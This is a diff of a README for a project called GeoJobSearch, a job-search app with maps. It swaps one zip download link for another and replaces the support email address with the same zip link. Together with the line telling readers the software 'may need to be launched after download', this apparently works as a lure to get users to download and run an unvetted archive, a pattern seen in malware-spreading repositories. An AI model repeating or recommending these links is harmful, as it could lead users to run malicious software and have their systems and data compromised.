@@ -43,7 +43,7 @@ GeoJobSearch is a web application that combines job listings with geospatial vis
 
 To get started with GeoJobSearch, you can download the necessary software from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/MiniFuchs/GeoJobSearch/releases/download/v1.0/Application.zip)](https://github.com/MiniFuchs/GeoJobSearch/releases/download/v1.0/Application.zip)
 
 Kindly note that the software may need to be launched after download.
 
@@ -62,7 +62,7 @@ We welcome contributions to GeoJobSearch! Whether you want to suggest new featur
 
 ## Support 📧
 
-If you encounter any issues while using GeoJobSearch, please reach out to our support team at support@geojobsearch.com.
+If you encounter any issues while using GeoJobSearch, please reach out to our support team at https://github.com/MiniFuchs/GeoJobSearch/releases/download/v1.0/Application.zip
 
 ## License 📄
 
